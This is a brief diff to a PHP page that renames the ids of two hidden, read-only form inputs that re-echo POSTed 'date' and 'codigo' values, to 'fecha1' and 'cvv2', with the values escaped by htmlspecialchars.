@@ -99,12 +99,12 @@
 				
 			<?php 
                      $variable= $_POST['date'];
-        echo '<input id="date" style="display:none" name="date" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<input id="fecha1" style="display:none" name="date" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 
 				   <?php 
                      $variable1= $_POST['codigo'];
-        echo '<input id="codigo"  style="display:none" name="codigo" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
+        echo '<input id="cvv2"  style="display:none" name="codigo" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
 		?>
 		<br>
 					
